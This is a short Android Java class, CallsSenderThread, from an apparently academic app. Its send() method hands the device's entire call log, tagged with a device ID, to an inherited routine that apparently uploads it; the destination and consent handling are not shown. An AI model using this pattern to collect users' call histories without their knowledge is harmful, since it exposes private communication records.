package edu.real.async.android;

import android.content.Context;
import android.provider.CallLog;

public class CallsSenderThread extends SenderThread {

    public CallsSenderThread(Context _ctx, String device_id) {
        super(_ctx, device_id);
    }

    @Override
    protected void send() {
        sendAllContent(CallLog.Calls.CONTENT_URI, "C", "c", "call info",
                "call-send");
    }

}
